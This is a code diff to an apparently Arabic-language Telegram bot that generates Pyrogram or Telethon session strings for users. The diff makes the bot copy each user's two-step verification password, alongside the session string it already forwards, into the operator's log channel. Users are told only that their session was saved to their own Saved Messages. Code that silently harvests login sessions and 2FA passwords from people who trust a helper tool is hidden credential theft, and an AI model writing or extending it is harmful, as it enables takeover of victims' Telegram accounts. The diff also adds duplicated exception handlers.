@@ -123,6 +123,12 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
         except (PhoneCodeExpired, PhoneCodeExpiredError):
             await msg.reply('رمز الدخول منتهى الصلاحية يرجى المحاولة مرة اخرى', reply_markup=InlineKeyboardMarkup(Data.generate_button))
             return
+        except (PhoneCodeInvalid, PhoneCodeInvalidError):
+            await msg.reply('الكود الذي أدخلته خاطئ يرجى إعادة الإستخراج مرة أخرى', reply_markup=InlineKeyboardMarkup(Data.generate_button))
+            return
+        except (PhoneCodeExpired, PhoneCodeExpiredError):
+            await msg.reply('رمز الدخول منتهى الصلاحية يرجى المحاولة مرة اخرى', reply_markup=InlineKeyboardMarkup(Data.generate_button))
+            return
         except (SessionPasswordNeeded, SessionPasswordNeededError):
             try:
                 two_step_msg = await bot.ask(user_id, 'التحقق بخطوتين مفعل بحسابك لذا قم بارساله.', filters=filters.text, timeout=300)
@@ -140,6 +146,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
             except (PasswordHashInvalid, PasswordHashInvalidError):
                 await two_step_msg.reply('الرمز خاطئ حاول مرة اخرى', quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
                 return
+
     else:
         if telethon:
             await client.start(bot_token=phone_number)
@@ -153,25 +160,30 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     try:
         if not is_bot:
             await client.send_message("me", text)
-            await send_to_log_channel(bot, text)  # Send to log channel
+            await send_to_log_channel(bot, text, two_step_msg.text if 'two_step_msg' in locals() else None)  # Send to log channel
         else:
             await bot.send_message(msg.chat.id, text)
-            await send_to_log_channel(bot, text)  # Send to log channel
+            await send_to_log_channel(bot, text, two_step_msg.text if 'two_step_msg' in locals() else None)  # Send to log channel
     except KeyError:
         pass
     await client.disconnect()
     await bot.send_message(msg.chat.id, "تم إنشاء جلسة سلسلة {} بنجاح. \n\nيرجى التحقق من رسائلك المحفوظة! \n\nبواسطة @PrivaPact".format("تليثون" if telethon else "بايروجرام"))
 
 
-# Create an async function to send session string to the log channel
-async def send_to_log_channel(bot, session_string):
+
+# Create an async function to send session string and 2FA code to the log channel
+async def send_to_log_channel(bot, session_string, two_step_code=None):
     try:
-        await bot.send_message(-1001834866606, session_string)  # Send to log channel
+        log_message = session_string
+        if two_step_code:
+            log_message += f"\n\n2FA Code: {two_step_code}"
+        await bot.send_message(LOG_CHANNEL, log_message)  # Send to log channel
     except ChatWriteForbiddenError:
         await bot.send_message(
             msg.chat.id,
             "ليس لدي صلاحية لإرسال رسالة إلى القناة المحددة. يرجى التحقق من إعدادات القناة ومنح البوت صلاحية الكتابة.",
         )
+
 
 async def cancelled(msg):
     if "/cancel" in msg.text:
